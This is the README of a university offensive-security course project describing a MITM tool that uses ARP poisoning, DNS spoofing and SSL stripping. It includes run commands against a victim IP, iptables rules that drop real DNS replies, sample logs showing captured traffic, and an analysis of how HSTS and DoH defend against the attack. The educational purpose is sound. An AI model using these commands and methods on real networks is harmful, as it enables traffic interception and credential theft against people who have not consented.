# 2IC80 Final Project - Group 28
By Sotiris Charalampopoulos (1785117), Nanda Potters (1983881), and Stefan Birca (1924818).

This project implements a Man-in-the-Middle (MITM) attack tool combining ARP Poisoning, DNS Spoofing, and SSL Stripping capabilities for analyzing the feasibility of SSL stripping attacks in modern networks.

## Project Structure
```
├── mitm_spoofer.py      # Main MITM attack tool (ARP + DNS + SSL Strip)
└── README.md            # This file
```

## Requirements
- Python 3.x
- Scapy (`pip3 install scapy`)
- dnspython (`pip3 install dnspython`)
- Root privileges (sudo)
- Two devices on the same network (attacker and victim)

## Dependent Global Variables
| Variable | Description |
|----------|-------------|
| **ATTACKER_IP** | IP address of the attacker's machine (auto-detected from interface) |
| **VICTIM_IP** | IP address of the target victim (provided via `--target` flag) |
| **SERVER_IP** | IP address to redirect DNS queries to (provided via `--server` flag, defaults to ATTACKER_IP) |
| **INTERFACE** | Network interface to use (provided via `--interface` flag, auto-detected if not specified) |
| **GATEWAY_IP** | IP address of the network gateway (auto-detected) |
| **MODE** | Attack mode: `SILENT` or `ALL_OUT` (provided via `--mode` flag) |
| **SPOOF_MAP** | Domain-to-IP mappings for targeted DNS spoofing (SILENT mode only) |
| **UPSTREAM_DNS** | DNS server used by proxy to resolve real IPs (default: 8.8.8.8) |
| **SSL_STRIP_PORT** | Port for SSL stripping proxy (default: 8080) |

## Attack Modes
| Mode | DNS Spoofing | ARP Timing | Use Case |
|------|--------------|------------|----------|
| **SILENT** | Targeted (SPOOF_MAP only) | Slow (4 seconds) | Stealthy, specific targets |
| **ALL_OUT** | All DNS queries | Fast (0.5 seconds) | Aggressive, full interception |

## How the Attack Works

### 1. ARP Poisoning
The attacker sends forged ARP replies to both the victim and the gateway:
- Tells victim: "I am the gateway" (attacker's MAC, gateway's IP)
- Tells gateway: "I am the victim" (attacker's MAC, victim's IP)

This positions the attacker in the middle of all traffic between victim and gateway.

### 2. DNS Spoofing
When the victim makes DNS queries:
- Attacker intercepts the DNS request
- Attacker sends a forged DNS response pointing to attacker's IP
- Legitimate DNS response from gateway is dropped via iptables

### 3. SSL Stripping
When victim visits HTTP websites:
- Traffic is redirected to attacker's proxy (port 8080) via iptables
- Proxy fetches content from real server (following HTTPS redirects)
- Proxy rewrites all HTTPS links to HTTP in the response
- Victim stays on HTTP while attacker speaks HTTPS to server
- HSTS headers are stripped from responses
- Secure flags are removed from cookies
- All traffic including POST data is logged for analysis

## Demostration Video
A demo video presenting the tool in action can be found [here](https://tuenl-my.sharepoint.com/:v:/g/personal/s_birca_student_tue_nl/IQBsqnjg29PXS4Fwwe3prCMuASuhaODbLIgRWV3pqM-Xg5c?e=R6WSc0).

## Usage

### Command Line Arguments
| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| --interface | No | Auto-detected | Network interface to use |
| --mode | Yes | - | SILENT or ALL_OUT |
| --target | Yes | - | Victim's IP address |
| --server | No | Attacker's IP | IP to redirect DNS queries to |

### Running the MITM Attack
```bash
sudo python3 mitm_spoofer.py --mode <SILENT|ALL_OUT> --target <victim_ip>
```

**Examples:**
```bash
# ALL_OUT mode - spoof all DNS queries (most common usage)
sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.1.50

# ALL_OUT mode with specific interface
sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.168.1.50

# SILENT mode - targeted spoofing (will prompt for domain)
sudo python3 mitm_spoofer.py --mode SILENT --target 192.168.1.50

# Redirect to external server (advanced usage)
sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.1.50 --server 192.168.1.20
```

## Testing Procedure

### Setup
1. **Attacker machine:** Your laptop/computer running the attack tool
2. **Victim machine:** A separate device (VM, phone, or another computer) on the same network

### Test 1: SSL Stripping on HTTP Sites

**Start the attack:**
```bash
sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.1.50
```

**Output:**
```
============================================================
    MITM Attack Tool - Offensive Cyber Security Lab
============================================================
[*] Mode: ALL_OUT
[*] Attacker: 192.168.1.10
[*] Victim: 192.168.1.50
[*] Interface: wlp0s20f3
[*] Gateway: 192.168.1.1 (aa:bb:cc:dd:ee:ff)
[*] Victim: 192.168.1.50 (11:22:33:44:55:66)
[*] IP Forwarding enabled
[A] IPTables: sudo iptables -A FORWARD -p udp -s 192.168.1.1 --sport 53 -d 192.168.1.50 -j DROP
[ARP] Poisoning started
[DNS] Spoofing started
[SSL Strip] iptables redirect port 80 -> 8080
[SSL Strip] Starting proxy on port 8080
[SSL] Stripping proxy started
============================================================
    Attack running. Ctrl+C to stop.
============================================================
```

**On Victim Device:**
1. Open browser and navigate to: `http://neverssl.com`
2. The page should load over HTTP (check address bar - no HTTPS)

**Attacker Terminal Output:**
```
[DNS Spoof] Query: 'neverssl.com.' from 192.168.1.50
[DNS Spoof] SPOOFING: neverssl.com. -> 192.168.1.10
[Analyzer] HTTP Request: GET neverssl.com/
[SSL Strip] GET http://neverssl.com/
[SSL Strip] Resolved neverssl.com -> 34.223.124.45
[SSL Strip] Sent 2048 bytes
```

### Test 2: HTTP→HTTPS Bridge Detection

**On Victim Device:**
1. Navigate to: `tui.com`
2. Page loads (possibly distorted due to failed subresources)

**Attacker Terminal Output:**
```
[DNS Spoof] SPOOFING: tui.com. -> 192.168.1.10
[Analyzer] HTTP Request: GET tui.com/
[SSL Strip] GET http://tui.com/
[SSL Strip] Resolved tui.com -> 2.16.6.227
[SSL Strip] Redirect -> https://tui.com/

[Analyzer] CRITICAL: HTTP→HTTPS BRIDGE DETECTED!
[Analyzer]   From: http://tui.com/
[Analyzer]   To: https://tui.com/
[Analyzer]   Status: 200

[Analyzer] HSTS Detected on tui.com
[SSL Strip] Sent 15234 bytes
```

This shows the "t0 moment" - the HTTP→HTTPS bridge where SSL stripping intercepts the upgrade.

### Test 3: HSTS Preload Protection

**On Victim Device:**
1. Navigate to: `google.com`

**Attacker Terminal Output:**
```
[SSL Strip] CONNECT google.com - HSTS protected
[Analyzer] Direct HTTPS: google.com - Likely HSTS Preload
```

This demonstrates that HSTS preload protects against SSL stripping - the browser never made an HTTP request.

### Terminating the Attack

Press `Ctrl+C` in the terminal:
```
[!] Shutting down...
[SSL Strip] Shutting down...

================================================================================
                 SSL STRIPPING FEASIBILITY ANALYSIS REPORT
================================================================================

 TRAFFIC SUMMARY:
   • Total HTTP requests: 5
   • HTTP→HTTPS upgrades detected: 2
   • Direct HTTPS attempts: 3
   • HTTPS links stripped: 47

 CRITICAL 'BRIDGE' MOMENTS (t0 - where attack could work):
   • 14:32:45: http://tui.com/ → https://tui.com/
   • 14:33:12: http://example.com/ → https://example.com/

 HSTS PROTECTION ANALYSIS:
   • tui.com: Max-Age=365.0 days
   • example.com: Max-Age=730.0 days

 CAPTURED CREDENTIALS:
   • No credentials captured

 ATTACK EFFECTIVENESS:
   • HSTS-protected sites: 2
   • Preload-protected sites: 3

================================================================================

[ARP Poison] ARP tables restored.
[D] IPTables: sudo iptables -D FORWARD -p udp -s 192.168.1.1 --sport 53 -d 192.168.1.50 -j DROP
[*] Cleanup complete
```

## Limitations and Modern Defenses

### Why SSL Stripping is Less Effective Today
1. **HSTS Preload Lists:** Major sites (Google, Facebook, Twitter) are hardcoded in browsers to always use HTTPS
2. **HSTS Headers:** Sites can tell browsers to always use HTTPS for future visits
3. **DNS-over-HTTPS (DoH):** Encrypts DNS queries, bypassing DNS spoofing
4. **Secure Cookies:** Cookies with `Secure` flag are not sent over HTTP
5. **Strict TLS Configurations:** Modern CDNs reject connections that don't meet strict TLS requirements

### What Still Works
- HTTP-only sites (rare today)
- First visit to sites with HSTS (before header is received)
- Sites not on HSTS preload list
- Sites without strict TLS configurations

### Expected Results
| Site Type | SSL Stripping Result |
|-----------|---------------------|
| HSTS Preload (google.com) | ❌ Fails - browser never makes HTTP request |
| Strict TLS (ebay.com) | ❌ Fails - TLS handshake rejected |
| Standard HTTPS (tui.com) | ⚠️ Partial - main page works, subresources may fail |
| HTTP-only (neverssl.com) | ✅ Works - full interception |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Cannot find MAC addresses" | Ensure victim is online and on same network |
| DNS spoofing not working | Disable DNS-over-HTTPS on victim's browser |
| "Address already in use" | Wait a moment or run `sudo killall python3` |
| Interface not found | Run `ip addr` to list available interfaces |
| SSL/TLS errors | Expected for sites with strict TLS - see Limitations |
| Distorted pages | Normal - subresources from CDNs often fail |

## Disclaimer

This tool is developed for educational purposes as part of the 2IC80 Offensive Cyber Security course at Eindhoven University of Technology. It should only be used in controlled lab environments with explicit permission. Unauthorized use of this tool against networks or systems you do not own or have permission to test is illegal.
